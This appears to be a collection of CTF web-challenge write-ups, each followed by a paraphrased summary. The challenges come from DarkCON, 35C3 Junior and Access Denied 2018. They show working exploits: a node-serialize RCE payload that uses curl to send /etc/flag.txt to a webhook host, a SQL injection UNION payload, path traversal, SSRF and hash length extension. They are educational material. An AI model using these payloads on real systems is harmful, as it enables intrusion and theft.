[Node.js script: Sign JWT token with 'redraider' as secret and use HS256 algorithm]

Now access the `/flag` using the token as cookie and we get the flag

The bug in this challenge was using a secret that could be easily cracked by brute-forcing.
"
"# Web+Crypto (3 solves / 498 points)
Made this website where you can read files 
Note: Flag at /etc/flag.txt

## Soure Code:
* [Source Code](https://github.com/karma9874/My-CTF-Challenges/tree/main/DarkCON-ctf/Misc/Web%2BCrypto)

## TL;DR
/readfile is vulnerable to length extension attack, so read source file of web app and exploiting the node-deserialization attack

## Solution

So from webpage source code we see that there are total 3 funionality of the web app registration,login,readfile

After login we get token using that token to readfile we can read the `68696e742e747874` (hex decode as hint.txt)

```bash
root@KARMA:/# curl -XPOST -H ""Content-Type: application/json"" -d '{""username"":""karma"",""password"":""karma""}' http://web-crypto.darkarmy.xyz/login
{""token"":""eyJ1bmFtZSI6Imthcm1hIiwiaWQiOjEyfQ==--RkBc/sh6/qVSgIjEBoBrQ4WKqI4=""}
```

```bash
root@KARMA:/# curl -XPOST -H ""Content-Type: application/json"" -d '{""token"": ""eyJ1bmFtZSI6Imthcm1hIiwiaWQiOjEyfQ==--RkBc/sh6/qVSgIjEBoBrQ4WKqI4="", ""filename"": ""68696e742e747874"", ""sig"":""e524127241021563a97661ef821d914fc838a942470f4ce9d3cbeaf75a666e01""}' http://web-crypto.darkarmy.xyz/readfile
{""filedata"":""Implementing MAC and adding cheese to it pfftt...easy,btw cheese length is less than 30 chars xD\n""}
```

`Implementing MAC and adding cheese to it and cheese length is less than 30 chars`  -> this suggest it to length extension attack with password length less than 30 chars given

Web app is running on nodejs so `package.json` must be present on the system

We get the contents of package.json at `22` so password length is `22`

```py
import hashpumpy
import requests
import json
import binascii
for i in range(1,30):
  sig,inp = hashpumpy.hashpump(""e524127241021563a97661ef821d914fc838a942470f4ce9d3cbeaf75a666e01"",""hint.txt"",""/../package.json"",i)
  filename = binascii.hexlify(inp).decode()
  url = 'http://web-crypto.darkarmy.xyz/readfile'
  myobj = {""token"": ""eyJ1bmFtZSI6Imthcm1hIiwiaWQiOjEyfQ==--RkBc/sh6/qVSgIjEBoBrQ4WKqI4="",""filename"":filename,""sig"":sig}
  x = requests.post(url, data = json.dumps(myobj),headers ={""Content-Type"":""application/json""})
  print(x.text)

# response 
# {""filedata"":""{\n  \""name\"": \""web_crypto\"",\n  \""version\"": \""1.0.0\"",\n  \""description\"": \""\"",\n  \""main\"": \""app.js\"",\n  \""scripts\"": {\n    \""test\"": \""echo \\\""Error: no test specified\\\"" && exit 1\""\n  },\n  \""keywords\"": [],\n  \""author\"": \""\"",\n  \""license\"": \""ISC\"",\n  \""dependencies\"": {\n    \""body-parser\"": \""^1.19.0\"",\n    \""dotenv\"": \""^8.2.0\"",\n    \""ejs\"": \""^3.1.5\"",\n    \""express\"": \""^4.17.1\"",\n    \""mysql\"": \""^2.18.1\"",\n    \""node-serialize\"": \""0.0.4\"",\n    \""cluster\"": \""^0.7.7\""\n  }\n}\n""}

```
From the response we can also read the `app.js` which leads to the file `/models/User.js` 

`node-serialize` is used in User.js for creating the user specific `token`

```js
encrypter(user) {
    var shasum = crypto.createHmac('sha1',process.env.AUTH_SECRET);
    var data = Buffer.from(serialize.serialize(user)).toString('base64') 
    return data+""--""+shasum.update(data).digest('base64'); 
    }

  decrypter(token) {
    return new Promise(function(resolve,reject){
    var data = token.split(""--"")
    var shasum = crypto.createHmac('sha1',process.env.AUTH_SECRET);
    if(data[1] === shasum.update(data[0]).digest('base64')){
        try{
          return resolve(serialize.unserialize(Buffer.from(data[0], 'base64').toString()))
        }catch(err){
          return reject(err.message);
        }
    }else{
      return reject(""Trying to hack? lol"")
    }});
  }
````

A little bit of google search for `node-serialize` leads to that the npm package is vulnerable to node-deserialization rce attack 

```js
app.post('/readfile',(req,res)=>{
  var token = req.body.token
  var sig = req.body.sig
  var name = req.body.filename
  console.log(token+sig+name)
  if(token && sig && name){
    var userobj = new User().decrypter(token).then(function(obj){
      filename = Buffer.from(name,'hex').toString('binary')
      new User().access_file(filename,sig).then(function(data){
        res.json({""filedata"":data})
      }).catch(function(err){
        res.json({""err"":err})
      })
    }).catch(function(err){
        res.json({""err"":err})
      });
  }else{
    res.json({""err"":""Invalid request""})
  }
});
```

And from `readfile` route we can check that the app first verifies the token and then forwards it to `decrypter` function which calls the `unserialize` function which can give rce

So for that to work we need to sign our payload with valid signature, so the AUTH_SECRET is comming from .env file which we can easily read it

.env file
```
DB_HOST=wc_mysql
DB_USER=root
DB_NAME=scam
nDB_PASS=scammer@123
HASH_SECRET=testingallthewayintoit
AUTH_SECRET=abhikliyekuchbhitestingkar
```

Solution Script
```py
from hashlib import sha1
import hmac
import requests

# {""rce"":""_$$ND_FUNC$$_function (){require('child_process').exec('curl -XPOST --data-binary \""@/etc/flag.txt\"" https://webhook.site/eb800bdc-e7a9-4765-852b-1a6513b56f4d', function(error, stdout, stderr) { console.log(stdout)});}()""}

raw = ""eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgLVhQT1NUIC0tZGF0YS1iaW5hcnkgXCJAL2V0Yy9mbGFnLnR4dFwiIGh0dHBzOi8vd2ViaG9vay5zaXRlL2ViODAwYmRjLWU3YTktNDc2NS04NTJiLTFhNjUxM2I1NmY0ZCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpfSk7fSgpIn0=""

key = ""abhikliyekuchbhitestingkar""
hashed = hmac.new(key, raw, sha1)
payload_token = hashed.digest().encode('base64')
url = 'http://web-crypto.darkarmy.xyz/readfile'
myobj = {""token"": payload_token,""filename"":""68696e742e747874"",""sig"":""e524127241021563a97661ef821d914fc838a942470f4ce9d3cbeaf75a666e01""}
x = requests.post(url, data = json.dumps(myobj),headers ={""Content-Type"":""application/json""})
print(x.text)
```

## Flag
> darkCON{l3ngth_3xt3ns10n_2_n0d3_s3r1411z3_brrrrr_xD}","`/readfile` is vulnerable to length extension attack, so read source file of web app and exploiting the node-deserialization attack

So from webpage source code we see that there are total 3 functionalities of the web app: registration, login, readfile.

After login we get token using that token to readfile we can read the `68696e742e747874` (hex decode as hint.txt)

[Command: Send a POST request to log in and receive a token]
[Output: JSON object with the token]

[Command: Send a POST request with the token and filename to read the file]
[Output: JSON object with the file data containing a hint]
""Implementing MAC and adding cheese to it and cheese length is less than 30 chars"".
This suggest it to length extension attack with password length less than 30 chars given

Web app is running on nodejs so `package.json` must be present on the system

We get the contents of package.json at `22` so password length is `22`
[Python script: Use hashpumpy to generate the modified hash and input, then send a POST request to read package.json]
[Response: Contents of package.json]
From the response we can also read the `app.js` which leads to the file `/models/User.js` 

`node-serialize` is used in User.js for creating the user specific `token`
[JavaScript code: encrypter and decrypter functions for user tokens]

A little bit of google search for `node-serialize` leads to that the npm package is vulnerable to node-deserialization rce attack 

[JavaScript code: readfile route implementation]

And from `readfile` route we can check that the app first verifies the token and then forwards it to `decrypter` function which calls the `unserialize` function which can give rce

So for that to work we need to sign our payload with valid signature, so the AUTH_SECRET is comming from .env file which we can easily read.

Solution Script
[Python script: Create a payload for RCE and send it to the server using the provided token and HMAC signature]

This script creates an RCE payload and sends it to the server using the provided token and HMAC signature. It then prints the response received from the server.
"
"# 35C3 Junior CTF – DB Secret

* **Category:** Web
* **Points:** 89 (variable)

## Challenge

> To enable secure microservices (or whatever, we don't know yet) over Wee in the future, we created a specific DB_SECRET, only known to us. This token is super important and extremely secret, hence the name. The only way an attacker could get hold of it is to serve good booze to the admins. Pretty sure it's otherwise well protected on our secure server.
>
> http://35.207.189.79/
>
> Difficulty Estimate: Medium
>
> ===============================================
>
> Good coders should learn one new language every year.
>
> InfoSec folks are even used to learn one new language for every new problem they face (YMMV).
>
> If you have not picked up a new challenge in 2018, you're in for a treat.
>
> We took the new and upcoming Wee programming language from paperbots.io. Big shout-out to Mario Zechner (@badlogicgames) at this point.
>
> Some cool Projects can be created in Wee, like: this, this and that.
>
> Since we already know Java, though, we ported the server (Server.java and Paperbots.java) to Python (WIP) and constantly add awesome functionality. Get the new open-sourced server at /pyserver/server.py.
>
> Anything unrelated to the new server is left unchanged from commit dd059961cbc2b551f81afce6a6177fcf61133292 at badlogics paperbot github (mirrored up to this commit here).
>
> We even added new features to this better server, like server-side Wee evaluation!
>
> To make server-side Wee the language of the future, we already implemented awesome runtime functions. To make sure our VM is 100% safe and secure, there are also assertion functions in server-side Wee that you don't have to be concerned about.

## Solution

Analyzing `http://35.207.189.79/pyserver/server.py` some interesting snippets can be discovered.

The vulnerable functionality is the following, because the query contains parameters replaced and not sanitized.

```Python
@app.route(""/api/getprojectsadmin"", methods=[""POST""])
def getprojectsadmin():
    # ProjectsRequest request = ctx.bodyAsClass(ProjectsRequest.class);
    # ctx.json(paperbots.getProjectsAdmin(ctx.cookie(""token""), request.sorting, request.dateOffset));
    name = request.cookies[""name""]
    token = request.cookies[""token""]
    user, username, email, usertype = user_by_token(token)

    json = request.get_json(force=True)
    offset = json[""offset""]
    sorting = json[""sorting""]

    if name != ""admin"":
        raise Exception(""InvalidUserName"")

    sortings = {
        ""newest"": ""created DESC"",
        ""oldest"": ""created ASC"",
        ""lastmodified"": ""lastModified DESC""
    }
    sql_sorting = sortings[sorting]

    if not offset:
        offset = datetime.datetime.now()

    return jsonify_projects(query_db(
        ""SELECT code, userName, title, public, type, lastModified, created, content FROM projects WHERE created < '{}' ""
        ""ORDER BY {} LIMIT 10"".format(offset, sql_sorting), one=False), username, ""admin"")
```

To obtain the `token` value, a login with `admin` user must be performed. The `token` will be set into the cookies. The login can be performed like in the [Logged In challenge](https://github.com/m3ssap0/CTF-Writeups/tree/master/35C3%20Junior%20CTF/Logged%20In).

The `DB_SECRET` variable, with the flag, is stored in another table that can be discovered in the following function.

```Python
def init_db():
    with app.app_context():
        db = get_db()
        with open(MIGRATION_PATH, ""r"") as f:
            db.cursor().executescript(f.read())
        db.execute(""CREATE TABLE `secrets`(`id` INTEGER PRIMARY KEY AUTOINCREMENT, `secret` varchar(255) NOT NULL)"")
        db.execute(""INSERT INTO secrets(secret) values(?)"", (DB_SECRET,))
        db.commit()
```

At this point a SQL injection payload can be crafted and sent to the server. The complete request with SQL injection payload is the following.

```
POST http://35.207.189.79/api/getprojectsadmin HTTP/1.1
Accept-Encoding: gzip,deflate
Cookie: token=menuknmgxhnnhbckbdspzaommgyiecsz; name=admin; logged_in=35C3_LOG_ME_IN_LIKE_ONE_OF_YOUR_FRENCH_GIRLS
Content-Type: application/json
Content-Length: 141
Host: 35.207.189.79
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)

{
	""offset"" : ""2018-12-25 00:00:00' UNION SELECT NULL, secret, NULL, NULL, NULL, NULL, NULL, NULL FROM secrets ---"", 
	""sorting"" : ""newest""
}
```

The answer will be the following.

```
HTTP/1.1 200 OK
Server: nginx/1.13.12
Date: Sat, 29 Dec 2018 19:44:52 GMT
Content-Type: application/json
Content-Length: 187
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Security-Policy: script-src 'self' 'unsafe-inline';
Referrer-Policy: no-referrer-when-downgrade
Feature-Policy: geolocation 'self'; midi 'self'; sync-xhr 'self'; microphone 'self'; camera 'self'; magnetometer 'self'; gyroscope 'self'; speaker 'self'; fullscreen *; payment 'self';

[{""code"":null,""content"":null,""created"":null,""lastModified"":null,""public"":null,""title"":null,""type"":null,""userName"":""35C3_ALL_THESE_YEARS_AND_WE_STILL_HAVE_INJECTIONS_EVERYWHERE__HOW???""}]
```

So, the flag is the following.

```
35C3_ALL_THESE_YEARS_AND_WE_STILL_HAVE_INJECTIONS_EVERYWHERE__HOW???
```","Analyzing `http://35.207.189.79/pyserver/server.py` some interesting snippets can be discovered.

The vulnerable functionality is the following, because the query contains parameters replaced and not sanitized.

[Python Flask API: Retrieve projects from the database based on the sorting criteria and offset value. Verify user is an admin and return the result as a JSON response]

To obtain the `token` value, a login with `admin` user must be performed. The `token` will be set into the cookies. The login can be performed like in the [Logged In challenge](https://github.com/m3ssap0/CTF-Writeups/tree/master/35C3%20Junior%20CTF/Logged%20In).

The `DB_SECRET` variable, with the flag, is stored in another table that can be discovered in the following function.

[Python function: Initialize database with migration script and a secrets table containing a single row with a secret value]

At this point a SQL injection payload can be crafted and sent to the server. The complete request with SQL injection payload is the following.

[HTTP POST: request with SQL Injection payload to retrieve project secrets]

The answer will be the following.

[HTTP response: Server returns a JSON object with one element containing null values for keys code, content, created, lastModified, public, title, and type; a non-null value for the key userName with the value of the flag]

So I got the flag.
"
"# 35C3 Junior CTF – flags

* **Category:** Web
* **Points:** 37 (variable)

## Challenge

> Fun with flags: http://35.207.169.47
>
> Flag is at /flag
>
> Difficulty estimate: Easy

## Solution

The page shows the PHP snippet of which is composed and an image.

The PHP code is the following.

```PHP
<?php
  highlight_file(__FILE__);
  $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'ot';
  $lang = explode(',', $lang)[0];
  $lang = str_replace('../', '', $lang);
  $c = file_get_contents(""flags/$lang"");
  if (!$c) $c = file_get_contents(""flags/ot"");
  echo '<img src=""data:image/jpeg;base64,' . base64_encode($c) . '"">';
```

The web site extracts the language passed via HTTP header, considers the first language and tries to load a picture from the `flags` folder; that picture will be displayed.

Even if the `str_replace('../', '', $lang)` instruction is used, the path traversal vulnerability is still present and can be abused using `....//` instead of `../`.

After some attempts, you will discover the correct HTTP header to use.

```
Accept-Language: ....//....//....//....//flag
```

The returned ""image"" will be the following.

```HTML
<img src=""data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo="">
```

Decoding the Base64 will give you the flag.

```
35c3_this_flag_is_the_be5t_fl4g
```","The page shows the PHP snippet of which is composed and an image.

The PHP code is the following.

[PHP code that retrieves an image file based on the user's preferred language. The code is vulnerable to directory traversal attacks since it does not properly sanitize the input received from the user.]

The web site extracts the language passed via HTTP header, considers the first language and tries to load a picture from the `flags` folder; that picture will be displayed.

Even if the `str_replace('../', '', $lang)` instruction is used, the path traversal vulnerability is still present and can be abused using `....//` instead of `../`.

After some attempts, you will discover the correct HTTP header to use.

[HTTP header tampering attempt with path traversal payload to potentially retrieve a flag]

The returned ""image"" will be the following.

``[HTML image tag with base64-encoded JPEG data]

Decoding the Base64 will give you the flag."
"# 35C3 Junior CTF – localhost

* **Category:** Web
* **Points:** 81 (variable)

## Challenge

> We came up with some ingenious solutions to the problem of password reuse. For users, we don't use password auth but send around mails instead. This works well for humans but not for robots. To make test automation possible, we didn't want to send those mails all the time, so instead we introduced the localhost header. If we send a request to our server from the same host, our state-of-the-art python server sets the localhost header to a secret only known to the server. This is bullet-proof, luckily.
>
> http://35.207.189.79/
> 
> Difficulty Estimate: Medium
>
> ===============================================
>
> Good coders should learn one new language every year.
>
> InfoSec folks are even used to learn one new language for every new problem they face (YMMV).
>
> If you have not picked up a new challenge in 2018, you're in for a treat.
>
> We took the new and upcoming Wee programming language from paperbots.io. Big shout-out to Mario Zechner (@badlogicgames) at this point.
>
> Some cool Projects can be created in Wee, like: this, this and that.
>
> Since we already know Java, though, we ported the server (Server.java and Paperbots.java) to Python (WIP) and constantly add awesome functionality. Get the new open-sourced server at /pyserver/server.py.
>
> Anything unrelated to the new server is left unchanged from commit dd059961cbc2b551f81afce6a6177fcf61133292 at badlogics paperbot github (mirrored up to this commit here).
>
> We even added new features to this better server, like server-side Wee evaluation!
>
> To make server-side Wee the language of the future, we already implemented awesome runtime functions. To make sure our VM is 100% safe and secure, there are also assertion functions in server-side Wee that you don't have to be concerned about.

## Solution

Analyzing `http://35.207.189.79/pyserver/server.py` two interesting methods can be discovered.

The header is set in the following method.

```Python
@app.after_request
def secure(response: Response):
    if not request.path[-3:] in [""jpg"", ""png"", ""gif""]:
        response.headers[""X-Frame-Options""] = ""SAMEORIGIN""
        response.headers[""X-Xss-Protection""] = ""1; mode=block""
        response.headers[""X-Content-Type-Options""] = ""nosniff""
        response.headers[""Content-Security-Policy""] = ""script-src 'self' 'unsafe-inline';""
        response.headers[""Referrer-Policy""] = ""no-referrer-when-downgrade""
        response.headers[""Feature-Policy""] = ""geolocation 'self'; midi 'self'; sync-xhr 'self'; microphone 'self'; "" \
                                             ""camera 'self'; magnetometer 'self'; gyroscope 'self'; speaker 'self'; "" \
                                             ""fullscreen *; payment 'self'; ""
        if request.remote_addr == ""127.0.0.1"":
            response.headers[""X-Localhost-Token""] = LOCALHOST

    return response
```

The functionality that can be abused to generate a request from the same server is the following.

```Python
# Proxy images to avoid tainted canvases when thumbnailing.
@app.route(""/api/proxyimage"", methods=[""GET""])
def proxyimage():
    url = request.args.get(""url"", '')
    parsed = parse.urlparse(url, ""http"")  # type: parse.ParseResult
    if not parsed.netloc:
        parsed = parsed._replace(netloc=request.host)  # type: parse.ParseResult
    url = parsed.geturl()

    resp = requests.get(url)
    if not resp.headers[""Content-Type""].startswith(""image/""):
        raise Exception(""Not a valid image"")

    # See https://stackoverflow.com/a/36601467/1345238
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for (name, value) in resp.raw.headers.items()
               if name.lower() not in excluded_headers]

    response = Response(resp.content, resp.status_code, headers)
    return response
```

This is the functionality used by the `loadImage` method in the programming environment.

The server runs at what defined here:

```Python
if __name__ == ""__main__"":
    app.run(host=""0.0.0.0"", port=8075)
```

An image is mandatory to abuse the service, because the Content-Type is strictly checked, but three extensions are blacklisted in the code that sets the target header.

Hence, the following image can be used: `img/paperbots.svg`.

The exploit is performed with a GET request like the following (or using `0.0.0.0` for the IP address).

```
http://35.207.189.79/api/proxyimage?url=http://127.0.0.1:8075/img/paperbots.svg
```
    
The response will contain the flag.

```
X-Localhost-Token: 35C3_THIS_HOST_IS_YOUR_HOST_THIS_HOST_IS_LOCAL_HOST
```","Analyzing `http://35.207.189.79/pyserver/server.py` two interesting methods can be discovered.

The header is set in the following method.

[Python function to add security headers to HTTP responses with special handling for localhost requests]

The functionality that can be abused to generate a request from the same server is the following.

[Flask route to proxy and serve images, with basic validation checks]

This is the functionality used by the `loadImage` method in the programming environment.

The server runs at what defined here:

[Python script: starts a web application and listens for incoming HTTP requests on all available network interfaces at port 8075.]

An image is mandatory to abuse the service, because the Content-Type is strictly checked, but three extensions are blacklisted in the code that sets the target header.

Hence, the following image can be used: `img/paperbots.svg`.

The exploit is performed with a GET request like the following (or using `0.0.0.0` for the IP address).

[HTTP GET request to fetch an image from a remote server via a proxy endpoint]
    
The response will contain the flag."
"# 35C3 Junior CTF – Logged In

* **Category:** Web
* **Points:** 47 (variable)

## Challenge

> Phew, we totally did not set up our mail server yet. This is bad news since nobody can get into their accounts at the moment... It'll be in our next sprint. Until then, since you cannot login: enjoy our totally finished software without account.
>
> http://35.207.189.79/
>
> ===============================================
>
> Good coders should learn one new language every year.
>
> InfoSec folks are even used to learn one new language for every new problem they face (YMMV).
>
> If you have not picked up a new challenge in 2018, you're in for a treat.
>
> We took the new and upcoming Wee programming language from paperbots.io. Big shout-out to Mario Zechner (@badlogicgames) at this point.
>
> Some cool Projects can be created in Wee, like: this, this and that.
>
> Since we already know Java, though, we ported the server (Server.java and Paperbots.java) to Python (WIP) and constantly add awesome functionality. Get the new open-sourced server at /pyserver/server.py.
>
> Anything unrelated to the new server is left unchanged from commit dd059961cbc2b551f81afce6a6177fcf61133292 at badlogics paperbot github (mirrored up to this commit here).
>
> We even added new features to this better server, like server-side Wee evaluation!
>
> To make server-side Wee the language of the future, we already implemented awesome runtime functions. To make sure our VM is 100% safe and secure, there are also assertion functions in server-side Wee that you don't have to be concerned about.

## Solution

The web site does not send double opt-in e-mail. A user can be registered, but the e-mail with the ""magic code"" needed to login will not be received.

Analyzing the response of the authentication API (i.e. `http://35.207.189.79/api/login`) a code can be found in the payload returned by the server. That code is the magic one that must be inserted in the window to complete the login.

After the login, a cookie will be set with the flag.

```
logged_in : 35C3_LOG_ME_IN_LIKE_ONE_OF_YOUR_FRENCH_GIRLS
```","The web site does not send double opt-in e-mail. A user can be registered, but the e-mail with the ""magic code"" needed to login will not be received.

Analyzing the response of the authentication API (i.e. `http://35.207.189.79/api/login`) a code can be found in the payload returned by the server. That code is the magic one that must be inserted in the window to complete the login.

After the login, a cookie will be set with the flag."
"# 35C3 Junior CTF – McDonald

* **Category:** Web
* **Points:** 44 (variable)

## Challenge

> Our web admin name's ""Mc Donald"" and he likes apples and always forgets to throw away his apple cores..
>
> http://35.207.91.38

## Solution

Visiting `http://35.207.91.38/robots.txt` will reveal the following content.

```
User-agent: *
Disallow: /backup/.DS_Store
```

So the `http://35.207.91.38/backup/.DS_Store` will download a `.DS_Store` file.

According to [Wikipedia](https://en.wikipedia.org/wiki/.DS_Store):
> In the Apple macOS operating system, .DS_Store is a file that stores custom attributes of its containing folder, such as the position of icons or the choice of a background image.

The [https://github.com/lijiejie/ds_store_exp](https://github.com/lijiejie/ds_store_exp) script could be used to download and extract hidden data.

```
./ds_store_exp.py http://35.207.91.38/backup/.DS_Store
```

The flag will be into `backup/b/a/c/flag.txt`.

```
35c3_Appl3s_H1dden_F1l3s
```","Visiting `http://35.207.91.38/robots.txt` will reveal the following content.

[Robots.txt file that disallows web crawlers from accessing the "".DS_Store"" file in the ""/backup/"" directory]

So the `http://35.207.91.38/backup/.DS_Store` will download a `.DS_Store` file.

According to Wikipedia: in the Apple macOS operating system, .DS_Store is a file that stores custom attributes of its containing folder, such as the position of icons or the choice of a background image.

The ds_store_exp script could be used to download and extract hidden data.

[Python script for exploiting .DS_Store files on a web server]"
"# 35C3 Junior CTF – Not(e) accessible

* **Category:** Web
* **Points:** 55 (variable)

## Challenge

> We love notes. They make our lifes more structured and easier to manage! In 2018 everything has to be digital, and that's why we built our very own note-taking system using micro services: Not(e) accessible! For security reasons, we generate a random note ID and password for each note.
>
> Recently, we received a report through our responsible disclosure program which claimed that our access control is bypassable...
>
> http://35.207.120.163
>
> Difficulty estimate: Easy-Medium

## Solution

If you try to submit a note (with spaces) an error will appear.

> ERROR! - Text does not match /^[a-zA-Z]+$/

If the text follows the shown regex, the note is inserted showing some info.

> Your note ID is 5779715767432985082
>
> Your note PW is 44a0cbcab0cdb0326be3b76b21bb25c9
>
> And the link to the note:
> http://35.207.120.163/view.php?id=5779715767432985082&pw=44a0cbcab0cdb0326be3b76b21bb25c9

Analyzing the HTML, you can find the following comment.

```HTML
<!-- My source is at /src.tgz -->
```

The archive contains both the frontend and the backend code.

Into the backend file `app.rb` you can discover the backend endpoint that must be called to retrieve the flag.

```Ruby
get '/admin' do
	File.read(""flag.txt"")
end
```

The code that can be abused is into frontend `view.php` file.

```PHP
if(file_exists(""./pws/"" . (int) $id . "".pw"")) {
    if(file_get_contents(""./pws/"" . (int) $id . "".pw"") == $_GET['pw']) {
        echo file_get_contents($BACKEND . ""get/"" . $id);
```

The `int` cast is not present everywhere, so the `id` parameter can be crafted like the following.

```
5779715767432985082/../../admin
```

With this parameter, the first two `if` statements will be true, because the result of the expression is the following, due to the fact that PHP will consider only the integer part for the cast.

```
./pws/5779715767432985082.pw
```

That result is a valid password file, the one created previously during the note submission.

The `file_get_contents` instruction will perform a HTTP GET call to the following backend endpoint.

```
$BACKEND/get/5779715767432985082/../../admin
```

That will be interpreted like `$BACKEND/admin`

Hence, the flag will be returned.

```
35C3_M1Cr0_S3rvices_4R3_FUN!
```","Analyzing the HTML, you can find the following comment.

[HTML comment indicating that the source code for a project or website is located in a file named ""src.tgz"". The "".tgz"" extension usually indicates that the file has been compressed using the gzip utility.]

The archive contains both the frontend and the backend code.

Into the backend file `app.rb` you can discover the backend endpoint that must be called to retrieve the flag.

[Ruby code defining a web application route that returns the contents of the ""flag.txt"" file when the path ""/admin"" is accessed.]

The code that can be abused is into frontend `view.php` file.

[PHP code that checks if a file exists and has specific contents before outputting the contents of another file with a certain ID obtained from a backend server.]

The `int` cast is not present everywhere, so the `id` parameter can be crafted like the following.

[A relative file path or URL that goes two directories up from the current directory and then accesses a directory named ""admin"".]

With this parameter, the first two `if` statements will be true, because the result of the expression is the following, due to the fact that PHP will consider only the integer part for the cast.

[File path pointing to a password-protected file or directory.]

That result is a valid password file, the one created previously during the note submission.

The `file_get_contents` instruction will perform a HTTP GET call to the following backend endpoint.

That will be interpreted like `$BACKEND/admin`

Hence, the flag will be returned."
"# 35C3 Junior CTF – saltfish

* **Category:** Web
* **Points:** 62 (variable)

## Challenge

> ""I have been told that the best crackers in the world can do this under 60 minutes but unfortunately I need someone who can do this under 60 seconds."" - Gabriel
>
> http://35.207.89.211

## Solution

The page shows the PHP snippet of which is composed (I added the comments with numbers on interesting lines of code).

```PHP
<?php
  require_once('flag.php');
  if ($_ = @$_GET['pass']) {                    /* #1 */
    $ua = $_SERVER['HTTP_USER_AGENT'];
    if (md5($_) + $_[0] == md5($ua)) {          /* #2 */
      if ($_[0] == md5($_[0] . $flag)[0]) {     /* #3 */
        echo $flag;
      }
    }
  } else {
    highlight_file(__FILE__);
  }
```

The `if` statement *#1* is useless for the analysis. `$_` is a normal variable populated with `pass` URL parameter content and the `@` clause does not affect anything in our scenario.

The `if` statement *#2* can be bypassed using the same value for `pass` URL parameter and for the User-Agent, because PHP's `==` gets confused with type conversions, lol.

The `if` statement *#3* contains the secret flag into a MD5 calculation, so it could seem hard to bypass, but:
* the MD5 hash can only have hex values from `0` to `f`;
* only the first char of two strings is considered in the comparison.

So the value of `$_[0]` can be between `0` and `f` only.

Trying single chars, from `0` to `f`, for the input of `pass` and User-Agent header, will reveal that `b` is the char that returns the flag.

```
35c3_password_saltf1sh_30_seconds_max
```","The page shows the PHP snippet of which is composed (I added the comments with numbers on interesting lines of code).

[PHP code with conditional statements that checks whether a given password input in the URL query parameter satisfies three conditions before outputting a secret flag. The code also includes a fallback to highlight the source code file if the password parameter is not provided.]

The `if` statement *#1* is useless for the analysis. `$_` is a normal variable populated with `pass` URL parameter content and the `@` clause does not affect anything in our scenario.

The `if` statement *#2* can be bypassed using the same value for `pass` URL parameter and for the User-Agent, because PHP's `==` gets confused with type conversions, lol.

The `if` statement *#3* contains the secret flag into a MD5 calculation, so it could seem hard to bypass, but:
* the MD5 hash can only have hex values from `0` to `f`;
* only the first char of two strings is considered in the comparison.

So the value of `$_[0]` can be between `0` and `f` only.

Trying single chars, from `0` to `f`, for the input of `pass` and User-Agent header, will reveal that `b` is the char that returns the flag."
"# Access Denied 1.2 2018 – codeIIEST

* **Category:** web
* **Points:** 50

## Challenge

> 0xeax developed the codeiiest website and hid the flag somewhere.
>
> It is the most beautiful website I have ever seen on this planet. Why don't you visit the website and get me the flag?
>
> Challenge running at : [https://codeiiest.github.io](https://codeiiest.github.io)

## Solution

In the home page of the website there is the following HTML comment at the end.

```html
<!-- Here's the first part of flag for You.  -->
<!-- part1 
accessdenied{1_w3nt_thr0ug -->

<!-- rest part of flag is in d4rks0c1ety page -->
```

On the other page, i.e. [https://codeiiest.github.io/d4rks0c1ety.html](https://codeiiest.github.io/d4rks0c1ety.html), you can find another HTML comment at the beginning.

```html
<!-- part 2 of the flag is -->
<!-- 
		h_th1s_w3bs1t3} 
-->

<!-- Thanks for your time. -->
```

So the flag is the following:

```
accessdenied{1_w3nt_thr0ugh_th1s_w3bs1t3}
```","In the home page of the website there is the following HTML comment at the end.

[HTML comments containing the first part of the flag, and that the rest of the flag can be found on the ""d4rks0c1ety"" page.]

On the other page, you can find another HTML comment at the beginning.

[HTML comments containing the second part of the flag]

So we got the flag."
"# Access Denied 1.2 2018 – Ghus Ke Dikhao

* **Category:** web
* **Points:** 200

## Challenge

> Rahul is a cheater !! Rahul is a cheater !!....
>
> So, Anjali made sure Rahul doesn't get access to her website as he is not admin.
>
> But Rahul is a Sai Baba devotee and he believes in ""Sabka Malik = 1""
>
> Challenge running at : [http://18.217.96.77:8081/](http://18.217.96.77:8081/)

## Solution

The website home page contains a login form.

Analyzing browser cookies, you can find the following one:

```
admin_id : 0
```

Changing it to `1` and refreshing the page will give you the flag.

```
accessdenied{4ye_4ye_4dm1n_xadv184v}
```","The website home page contains a login form.

Analyzing browser cookies, you can find that admin_id is 0.

Changing it to 1 and refreshing the page will give you the flag."
"# Access Denied 1.2 2018 – JS and JQuery

* **Category:** web
* **Points:** 175

## Challenge

> JS was very happy with his abilities. But JQuery gave him superpower.
>
> And we all know - **With great power comes great responsibility.**
>
> Challenge running at : [http://18.217.96.77:8080/](http://18.217.96.77:8080/)

## Solution

Analyzing the browser console, you can find an error:

```
jquery-3.3.1.min.js:2 Uncaught SyntaxError: Unexpected token {
```

Going to that portion of the JavaScript file will reveal the flag:

```
accessdenied{1t_w4s_h1dd3n_h3r3_594a9sd}
```","Analyzing the browser console, you can find an error:

[Error message indicating a syntax error in the jQuery library file ]

Going to that portion of the JavaScript file will reveal the flag."
"# Access Denied 1.2 2018 – Monica's fear

* **Category:** web
* **Points:** 150

## Challenge

> Monica figured out Phoebe's grandmother's secret recipe and asked Chandler to hide it somewhere safe. However he was drunk and he can not remember where he kept it.
>
> Can you find it ?
>
> Challenge running at : http://13.58.20.227:8080/

## Solution

In the home page of the website there is a strange message:

> Wow INSTRUO team loves :cookie:

Analyzing browser cookies, you can find the following one:

```
flag : YWNjZXNzZGVuaWVke2MwMGtpM3NfNHIzX3Q0c3R5XzY1OXdkczF9
```

Decoding the Base64 cookie value will give you the flag.

```
accessdenied{c00ki3s_4r3_t4sty_659wds1}
```","In the home page of the website there is a strange message:
Wow INSTRUO team loves :cookie:

Analyzing browser cookies, you can find the flag encoded in base 64.

